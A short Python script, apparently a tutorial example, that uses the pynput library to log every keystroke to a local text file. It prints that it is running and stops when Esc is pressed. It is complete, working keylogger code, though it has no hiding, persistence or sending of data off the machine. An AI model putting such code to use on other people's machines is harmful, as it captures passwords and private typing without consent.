from pynput import keyboard

# Define the file where keystrokes will be saved
log_file = "key_log.txt"

def on_press(key):
    """
    This function is triggered every time a key is pressed.
    It converts the key to a string and writes it to the text file.
    """
    try:
        # Try to capture standard alphanumeric keys (letters, numbers)
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # Handle special keys (Space, Enter, Shift, etc.)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")  # Write an actual space instead of 'Key.space'
            elif key == keyboard.Key.enter:
                f.write("\n") # Move to a new line on Enter
            else:
                f.write(f" [{key}] ") # Wrap other keys like [Key.shift]

def on_release(key):
    """
    Optional: This function triggers when a key is released.
    We can use the 'Esc' key to stop the keylogger safely.
    """
    if key == keyboard.Key.esc:
        print("\nStopping the keylogger...")
        return False  # Returning False stops the listener

# Setting up the listener to monitor the keyboard
print("Keylogger is running... Press 'Esc' to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()